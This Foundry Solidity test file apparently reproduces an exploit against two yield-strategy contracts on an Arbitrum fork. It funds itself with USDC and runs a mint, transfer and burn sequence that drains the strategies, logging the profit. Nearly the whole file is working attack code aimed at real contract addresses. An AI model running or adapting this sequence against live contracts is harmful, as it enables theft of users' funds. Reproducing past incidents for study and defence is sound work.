// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IBalancer.sol";
import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";

import "./IStrategy.sol";

/*  
console.log(strategy1.balanceOf(address(this)));
console.log(strategy2.balanceOf(address(strategy2)));
*/

contract YieldTest is Test {
    WETH9 WETH = WETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 DAI = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);
    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IBalancerVault vault =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    IStrategy strategy1 = IStrategy(0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa);
    IStrategy strategy2 = IStrategy(0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47);

    function setUp() public {
        vm.createSelectFork("arb_one", 206_219_812 - 1);
        deal(address(USDC), address(this), 400_000 * 1e6);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        USDC.transfer(address(strategy1), 308_000 * 1e6);
        strategy1.mintDivested(address(this));

        uint256 transferAmount = strategy1.balanceOf(address(this)) / 2;
        strategy1.transfer(address(strategy2), transferAmount);
        strategy2.mint(address(strategy2));

        strategy1.transfer(
            address(strategy2),
            strategy1.balanceOf(address(this))
        );
        strategy2.burn(address(this));

        strategy2.mint(address(strategy2));
        strategy2.burn(address(this));

        strategy1.transfer(
            address(strategy1),
            strategy1.balanceOf(address(this))
        );
        strategy1.burnDivested(address(this));

        // 95_158.562521
        print("USDC Balance After exploit", USDC.balanceOf(address(this)), 6);
    }
}
